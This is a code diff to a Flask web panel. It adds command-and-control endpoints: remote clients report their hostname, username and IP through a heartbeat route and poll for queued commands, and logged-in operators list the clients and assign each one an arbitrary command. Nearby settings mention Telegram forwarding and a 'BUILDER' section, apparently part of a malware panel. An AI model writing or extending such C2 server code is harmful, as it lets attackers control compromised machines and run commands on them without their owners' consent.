@@ -87,6 +87,17 @@ def init_db():
                 value TEXT
             )
         ''')
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS clients (
+                client_id TEXT PRIMARY KEY,
+                hostname TEXT,
+                username TEXT,
+                ip TEXT,
+                last_heartbeat TIMESTAMP,
+                pending_command TEXT
+            )
+        ''')
+
         for k, v in [
             ('tg_forward_enabled', 'false'), ('tg_bot_token', ''), ('tg_chat_id', ''),
             ('active_bg_theme', 'theme-default'), ('bg_blur_value', '15'), ('custom_bg_path', '')
@@ -704,6 +715,97 @@ def admin_set_role(target_id):
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+# ===== C2 ENDPOINTS =====
+
+@app.route('/api/c2/heartbeat', methods=['POST'])
+def c2_heartbeat():
+    key = request.headers.get('x-panel-key', '')
+    if not key:
+        return jsonify({'error': 'unauthorized'}), 401
+    with get_db() as db:
+        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
+        if not user:
+            return jsonify({'error': 'unauthorized'}), 401
+
+    data = request.json or {}
+    client_id = data.get('client_id', '')
+    hostname = data.get('hostname', '')
+    username = data.get('username', '')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if not client_id:
+        return jsonify({'error': 'missing client_id'}), 400
+
+    with get_db() as db:
+        db.execute('''
+            INSERT INTO clients (client_id, hostname, username, ip, last_heartbeat)
+            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+            ON CONFLICT(client_id) DO UPDATE SET
+                hostname = excluded.hostname,
+                username = excluded.username,
+                ip = excluded.ip,
+                last_heartbeat = CURRENT_TIMESTAMP
+        ''', (client_id, hostname, username, ip))
+        db.commit()
+    return jsonify({'status': 'ok'})
+
+
+@app.route('/api/c2/command', methods=['GET'])
+def c2_get_command():
+    key = request.headers.get('x-panel-key', '')
+    if not key:
+        return jsonify({'error': 'unauthorized'}), 401
+    with get_db() as db:
+        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
+        if not user:
+            return jsonify({'error': 'unauthorized'}), 401
+
+    client_id = request.args.get('client_id', '')
+    if not client_id:
+        return jsonify({'command': ''})
+
+    with get_db() as db:
+        row = db.execute('SELECT pending_command FROM clients WHERE client_id = ?', (client_id,)).fetchone()
+        if row and row['pending_command']:
+            cmd = row['pending_command']
+            db.execute('UPDATE clients SET pending_command = NULL WHERE client_id = ?', (client_id,))
+            db.commit()
+            return jsonify({'command': cmd})
+    return jsonify({'command': ''})
+
+
+@app.route('/api/c2/clients', methods=['GET'])
+@login_required
+def c2_list_clients():
+    with get_db() as db:
+        rows = db.execute('SELECT client_id, hostname, username, ip, last_heartbeat, pending_command FROM clients ORDER BY last_heartbeat DESC').fetchall()
+    clients = []
+    for r in rows:
+        clients.append({
+            'client_id': r['client_id'],
+            'hostname': r['hostname'],
+            'username': r['username'],
+            'ip': r['ip'],
+            'last_heartbeat': r['last_heartbeat'],
+            'pending_command': r['pending_command']
+        })
+    return jsonify(clients)
+
+
+@app.route('/api/c2/command', methods=['POST'])
+@login_required
+def c2_send_command():
+    data = request.json or {}
+    client_id = data.get('client_id', '')
+    command = data.get('command', '')
+    if not client_id or not command:
+        return jsonify({'error': 'missing fields'}), 400
+
+    with get_db() as db:
+        db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ?', (command, client_id))
+        db.commit()
+    return jsonify({'success': True})
+
 
 # ===== BUILDER =====
 
